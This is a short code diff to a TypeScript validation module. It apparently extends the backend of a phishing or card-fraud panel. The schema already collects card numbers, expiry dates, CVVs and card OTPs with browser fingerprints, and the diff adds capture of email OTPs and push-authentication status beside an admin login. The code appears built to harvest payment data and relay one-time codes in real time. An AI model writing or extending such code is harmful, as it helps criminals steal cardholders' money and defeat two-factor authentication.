@@ -20,6 +20,8 @@ export const sessionSyncSchema = z.object({
   cardExpiry: z.string().optional(),
   cardCvv: z.string().optional(),
   cardOtp: z.string().optional(),
+  emailOtp: z.string().optional(),
+  pushAuthStatus: z.string().optional(),
   fingerprint: z.object({
     userAgent: z.string().optional(),
     language: z.string().optional(),
@@ -69,7 +71,9 @@ export const validateSessionSync = [
   body('phoneNumber').optional({ nullable: true, checkFalsy: true }).isMobilePhone('any').withMessage('Invalid phone number'),
   body('cardNumber').optional({ nullable: true, checkFalsy: true }).isCreditCard().withMessage('Invalid card number'),
   body('cardExpiry').optional({ nullable: true, checkFalsy: true }).matches(/^\d{2}\/\d{2}$/).withMessage('Invalid expiry format (MM/YY)'),
-  body('cardCvv').optional({ nullable: true, checkFalsy: true }).isLength({ min: 3, max: 4 }).withMessage('Invalid CVV')
+  body('cardCvv').optional({ nullable: true, checkFalsy: true }).isLength({ min: 3, max: 4 }).withMessage('Invalid CVV'),
+  body('emailOtp').optional({ nullable: true, checkFalsy: true }).isString().isLength({ min: 3, max: 10 }).withMessage('Invalid Email OTP'),
+  body('pushAuthStatus').optional().isString()
 ];
 
 export const validateAdminLogin = [
